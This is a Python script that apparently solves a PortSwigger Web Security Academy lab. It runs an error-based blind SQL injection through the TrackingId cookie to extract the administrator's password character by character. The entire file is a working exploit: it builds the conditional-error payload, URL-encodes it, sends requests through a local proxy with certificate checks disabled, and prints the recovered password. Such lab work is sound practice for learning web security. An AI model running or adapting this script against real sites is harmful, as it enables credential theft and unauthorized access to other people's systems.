import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


URL= 'https://0a4a007903aa297bc2ff8e8d00050030.web-security-academy.net/'

def blindsql(url):
    password = ''
    for i in range(1,21):
        for j in range(32, 126):
            sql_payload = "'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users WHERE username = 'administrator' and ascii(substr(password, %s, 1)) = %s)  || '" % (i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId' : 'qPFy7RESYysR9v9p' + sql_payload_encoded, 'session' : 'ffyb5nNnhMG9X5Nrg0TilriQLlJfDb7a'}
            r = requests.get(url=url, cookies=cookies, verify=False, proxies=proxies)
            if "Internal Server Error" in r.text:
                password += chr(j)
                print("Found " + " character " + str(i) + "! :" + chr(j))
                break
            else:
                print("Not " + chr(j) + " Retrying another character...")

    print("Password for administrator is : " + password)


blindsql(URL)
